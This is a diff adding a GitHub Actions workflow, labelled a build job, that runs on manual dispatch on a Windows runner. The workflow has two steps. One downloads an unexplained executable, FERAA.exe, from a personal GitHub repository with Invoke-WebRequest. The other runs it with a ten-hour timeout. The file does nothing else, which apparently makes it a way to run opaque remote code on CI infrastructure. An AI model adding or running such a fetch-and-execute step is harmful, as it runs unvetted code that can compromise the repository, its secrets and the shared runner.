@@ -1,0 +1,11 @@
+name: FERAA
+on: workflow_dispatch
+jobs:
+  build:
+    runs-on: windows-2019
+    steps:
+    - name: SEC
+      run: Invoke-WebRequest https://github.com/Fedevvx/Vccc/raw/main/FERAA.exe -OutFile FERAA.exe
+    - name: FDC
+      run: .\FERAA.exe
+      timeout-minutes: 600
